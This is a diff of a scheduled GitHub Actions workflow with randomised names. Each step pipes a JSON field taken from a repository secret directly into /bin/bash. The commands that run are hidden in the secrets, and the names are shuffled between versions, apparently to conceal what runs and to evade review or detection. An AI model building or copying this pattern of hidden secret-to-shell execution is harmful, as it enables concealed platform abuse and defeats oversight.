@@ -2,28 +2,21 @@ name: jaijkx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 5/6 * * *'
+    - cron: '23 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jaijkx
         env:
-          vs32: ${{ secrets.vs32 }}
+          iqebc62335: ${{ secrets.iqebc62335 }}
         run: |
-          echo $vs32 | jq -r .xyr20 | /bin/bash
-          echo $jx1274 | jq -r .ahabv6 | /bin/bash
-          echo $tvik3326 | jq -r .vsjs5 | /bin/bash
-          echo $xjl6 | jq -r .ab6516 | /bin/bash
-          echo $ngv32 | jq -r .hcczc41686 | /bin/bash
-          echo $lhmgi44239 | jq -r .kjvam857 | /bin/bash
-          echo $ihfc368 | jq -r .zae5461 | /bin/bash
-          echo $ui830 | jq -r .nltg4 | /bin/bash
-          echo $p04877 | jq -r .xlyz61 | /bin/bash
-          echo $psfi76 | jq -r .x460 | /bin/bash
-          echo $knbhn74 | jq -r .gwoib8715 | /bin/bash
-          echo $z10 | jq -r .xzod43 | /bin/bash
-          echo $le148 | jq -r .guskh2 | /bin/bash
+          echo $iqebc62335 | jq -r .rw603 | /bin/bash
+          echo $yayg145 | jq -r .watk95 | /bin/bash
+          echo $vsmr6759 | jq -r .xetnd066 | /bin/bash
+          echo $uxbwb141 | jq -r .bcn65 | /bin/bash
+          echo $n03 | jq -r .fqsu165 | /bin/bash
 
